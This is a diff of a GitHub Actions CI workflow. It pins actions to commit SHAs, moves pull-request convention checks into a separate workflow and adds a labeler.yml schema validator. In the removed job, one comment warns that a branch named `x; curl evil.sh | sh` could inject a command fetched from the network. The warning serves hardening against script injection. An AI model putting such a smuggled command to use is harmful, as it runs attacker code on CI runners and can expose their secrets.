@@ -18,7 +18,8 @@
 #      identically here and inside .githooks/pre-push on a contributor's
 #      machine, so what is enforced locally is exactly what is enforced here.
 #   3. One workflow per concern — security.yml for credentials, db-check.yml for
-#      the schema, e2e.yml for browser tests — so each maps to exactly one
+#      the schema, e2e.yml for browser tests, pr-conventions.yml for the pull
+#      request's title, branch, commits and size — so each maps to exactly one
 #      required status check.
 #   4. Required checks are listed in docs/CI_CD.md and applied by
 #      .github/branch-protection/apply.sh.
@@ -38,7 +39,6 @@ concurrency:
   cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
 
 env:
-  PNPM_VERSION: '9.15.9'
   NODE_VERSION: '22'
   NEXT_TELEMETRY_DISABLED: '1'
 
@@ -59,7 +59,7 @@ jobs:
     timeout-minutes: 15
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v5
+        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0
         with:
           fetch-depth: 0
           # The token is not needed after checkout: every step below reads the
@@ -157,6 +157,66 @@ jobs:
           fi
           echo "actionlint: all workflows are structurally valid."
 
+      # Moved here from pr-automation.yml. There it validated the BASE branch's
+      # copy after the fact; here it validates the copy a pull request proposes,
+      # so a broken labeler.yml cannot merge in the first place.
+      - name: Validate the labeler configuration (actions/labeler v5+ schema)
+        run: |
+          if [ ! -f .github/labeler.yml ]; then
+            echo "::error::.github/labeler.yml is missing, so pr-automation.yml cannot apply labels from the diff."
+            exit 1
+          fi
+          if ! python3 -c 'import yaml' >/dev/null 2>&1; then
+            echo "::notice::PyYAML is not available; skipping labeler.yml validation."
+            exit 0
+          fi
+          python3 - <<'PY'
+          import sys, yaml
+
+          MATCHERS = {'changed-files', 'head-branch', 'base-branch', 'any', 'all'}
+          TOP_LEVEL_SCALARS = {'changed-files-labels-limit', 'max-files-changed'}
+
+          try:
+              cfg = yaml.safe_load(open('.github/labeler.yml', encoding='utf-8'))
+          except yaml.YAMLError as exc:
+              print(f'::error file=.github/labeler.yml::not valid YAML: {exc}')
+              sys.exit(1)
+
+          if not isinstance(cfg, dict) or not cfg:
+              print('::error file=.github/labeler.yml::empty or malformed.')
+              sys.exit(1)
+
+          problems = []
+          labels = 0
+          for label, rules in cfg.items():
+              if label in TOP_LEVEL_SCALARS:
+                  continue
+              labels += 1
+              # The v5+ schema: label -> list of configuration objects. A mapping
+              # here is the v4 shape, and the action rejects it at run time with
+              # "should be array of config options".
+              if not isinstance(rules, list):
+                  problems.append(
+                      f"'{label}': expected a list of rule objects, got {type(rules).__name__} "
+                      f"(actions/labeler v5+ schema)")
+                  continue
+              for rule in rules:
+                  if not isinstance(rule, dict) or not rule:
+                      problems.append(f"'{label}': every list entry must be a rule object")
+                      continue
+                  unknown = set(rule) - MATCHERS
+                  if unknown:
+                      problems.append(
+                          f"'{label}': unknown matcher(s) {sorted(unknown)}; "
+                          f"allowed: {sorted(MATCHERS)} (note: 'title' was removed in v5)")
+
+          if problems:
+              for problem in problems:
+                  print(f'::error file=.github/labeler.yml::{problem}')
+              sys.exit(1)
+          print(f'labeler.yml is valid ({labels} label(s), actions/labeler v5+ schema).')
+          PY
+
       - name: Validate CODEOWNERS
         run: |
           if [ ! -f .github/CODEOWNERS ]; then
@@ -227,107 +287,15 @@ jobs:
           shellcheck -S warning -x -f gcc "${scripts[@]}"
 
   # ---------------------------------------------------------------------------
-  # Job 2 — Pull-request discipline.
+  # Pull-request discipline ("PR Conventions") lives in pr-conventions.yml.
   #
-  # Only meaningful for pull requests: title conventions, branch naming,
-  # issue linkage, PR size, and linear history.
+  # It needs to re-run when a title, description or label changes, and this
+  # workflow must not: re-running lint, tests, the build and Lighthouse because
+  # somebody fixed a typo in a title would waste ten minutes of runner time.
   # ---------------------------------------------------------------------------
-  pr-conventions:
-    name: PR Conventions
-    runs-on: ubuntu-latest
-    # Deliberately NOT `needs: hygiene`. This job is cheap and reports on things
-    # a contributor can fix without touching the code (title, branch name, PR
-    # size), so it must still run — and still report a conclusion — when the
-    # hygiene job has already failed. Gating it on hygiene would leave it
-    # "skipped", and a skipped check tells a contributor nothing.
-    if: github.event_name == 'pull_request'
-    timeout-minutes: 15
-    steps:
-      # `actions/checkout` on a pull_request event checks out refs/pull/N/merge
-      # by default — a synthetic merge commit GitHub creates for the PR. That
-      # makes every linear-history check report a false merge commit, so the
-      # head SHA is checked out explicitly instead.
-      #
-      # `fetch-depth: 0` fetches the complete history of every branch, so
-      # `origin/$BASE_REF` is available without a second `git fetch` — which is
-      # what lets the checkout run with `persist-credentials: false`. No
-      # credential is left in .git/config for a later step (or an artifact) to
-      # pick up.
-      - name: Checkout the pull-request head
-        uses: actions/checkout@v5
-        with:
-          fetch-depth: 0
-          ref: ${{ github.event.pull_request.head.sha }}
-          persist-credentials: false
-
-      - name: Verify the base branch is available
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          if ! git rev-parse --verify --quiet "origin/$BASE_REF" >/dev/null; then
-            echo "::error::The base branch 'origin/$BASE_REF' is not present in the clone, so the commit range cannot be computed. This is a bug in the workflow, not in the contribution."
-            exit 1
-          fi
-          echo "Base branch origin/$BASE_REF is available at $(git rev-parse --short "origin/$BASE_REF")."
-
-      # `github.head_ref` is attacker-controlled: a contributor can name a
-      # branch `x; curl evil.sh | sh` and GitHub will interpolate it into the
-      # script before the shell ever sees it. Always pass untrusted values
-      # through the environment and reference them as shell variables.
-      - name: Validate branch naming
-        env:
-          BASE_REF: ${{ github.base_ref }}
-          HEAD_REF: ${{ github.head_ref }}
-        run: bash scripts/checks/check-branch-name.sh "$HEAD_REF"
-
-      - name: Validate commit messages (Conventional Commits)
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          bash scripts/checks/check-commit-msg.sh --range "origin/$BASE_REF...HEAD"
-
-      - name: Validate pull-request metadata
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-          PR_TITLE: ${{ github.event.pull_request.title }}
-          PR_BODY: ${{ github.event.pull_request.body }}
-          PR_HEAD_REF: ${{ github.head_ref }}
-          PR_BASE_REF: ${{ github.base_ref }}
-          PR_COMMITS: ${{ github.event.pull_request.commits }}
-          PR_ADDITIONS: ${{ github.event.pull_request.additions }}
-          PR_DELETIONS: ${{ github.event.pull_request.deletions }}
-          PR_CHANGED_FILES: ${{ github.event.pull_request.changed_files }}
-          PR_LABELS: ${{ join(github.event.pull_request.labels.*.name, ',') }}
-        run: bash scripts/checks/check-pr-meta.sh
-
-      - name: Semantic pull-request title (advisory annotations)
-        if: always()
-        uses: amannn/action-semantic-pull-request@v6
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          types: |
-            feat
-            fix
-            docs
-            style
-            refactor
-            perf
-            test
-            build
-            ci
-            chore
-            revert
-          requireScope: false
-          subjectPattern: '^[a-z].{1,71}$'
-          subjectPatternError: >
-            The PR title subject must start with a lowercase letter and be at
-            most 72 characters, because it becomes the squash-merge commit on
-            main.
-        continue-on-error: true
 
   # ---------------------------------------------------------------------------
-  # Job 3 — Verify: lint, types, formatting, tests, build.
+  # Job 2 — Verify: lint, types, formatting, tests, build.
   #
   # Activates automatically the moment package.json + pnpm-lock.yaml land.
   # Until then it succeeds with an explanatory notice so it can safely be a
@@ -340,7 +308,7 @@ jobs:
     timeout-minutes: 25
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v5
+        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0
         with:
           persist-credentials: false
 
@@ -357,15 +325,17 @@ jobs:
 
       - name: Setup Node.js
         if: steps.detect.outputs.app == 'true'
-        uses: actions/setup-node@v6
+        uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
         with:
           node-version: ${{ env.NODE_VERSION }}
 
+      # The pnpm version comes from the `packageManager` field of package.json
+      # (check-lockfiles.sh requires it), so there is one place to bump it. A
+      # SHA-pinned action rather than `npm install --global pnpm@…`: Scorecard
+      # (Pinned-Dependencies) treats any `npm install` as an unpinned download.
       - name: Install pnpm
         if: steps.detect.outputs.app == 'true'
-        run: |
-          npm install --global "pnpm@$PNPM_VERSION"
-          pnpm --version
+        uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
 
       - name: Resolve pnpm store path
         if: steps.detect.outputs.app == 'true'
@@ -374,7 +344,7 @@ jobs:
 
       - name: Cache the pnpm store
         if: steps.detect.outputs.app == 'true'
-        uses: actions/cache@v6
+        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
         with:
           path: ${{ steps.store.outputs.path }}
           key: ${{ runner.os }}-pnpm-store-${{ hashFiles('pnpm-lock.yaml') }}
@@ -443,17 +413,23 @@ jobs:
           fi
           echo "Client bundle is free of credential material."
 
+      # .next/cache is the webpack/SWC build cache. Lighthouse only needs the
+      # server output, and the cache grows to hundreds of megabytes as the app
+      # does — every one of which would be uploaded here and downloaded again
+      # by the next job.
       - name: Upload build output
         if: steps.detect.outputs.app == 'true'
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: next-build-output
-          path: .next/
+          path: |
+            .next/
+            !.next/cache/
           retention-days: 7
           if-no-files-found: ignore
 
   # ---------------------------------------------------------------------------
-  # Job 4 — Accessibility budget (Lighthouse CI).
+  # Job 3 — Accessibility budget (Lighthouse CI).
   #
   # Budgets come from docs/UI_UX_SPECIFICATION.md and the roadmap MVP gate:
   # performance >= 90, accessibility >= 95.
@@ -465,7 +441,7 @@ jobs:
     timeout-minutes: 20
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v5
+        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0
         with:
           persist-credentials: false
 
@@ -481,19 +457,21 @@ jobs:
 
       - name: Setup Node.js
         if: steps.detect.outputs.app == 'true'
-        uses: actions/setup-node@v6
+        uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
         with:
           node-version: ${{ env.NODE_VERSION }}
 
-      - name: Install pnpm and dependencies
+      - name: Install pnpm
         if: steps.detect.outputs.app == 'true'
-        run: |
-          npm install --global "pnpm@$PNPM_VERSION"
-          pnpm install --frozen-lockfile
+        uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
+
+      - name: Install dependencies
+        if: steps.detect.outputs.app == 'true'
+        run: pnpm install --frozen-lockfile
 
       - name: Download build output
         if: steps.detect.outputs.app == 'true'
-        uses: actions/download-artifact@v4
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
         with:
           name: next-build-output
           path: .next/
@@ -504,7 +482,7 @@ jobs:
       # profile — one place for the whole audit, versioned with the code.
       - name: Run Lighthouse CI
         if: steps.detect.outputs.app == 'true'
-        uses: treosh/lighthouse-ci-action@v12
+        uses: treosh/lighthouse-ci-action@3e7e23fb74242897f95c0ba9cabad3d0227b9b18 # 12.6.2
         with:
           configPath: .github/lighthouse/config.json
           uploadArtifacts: true
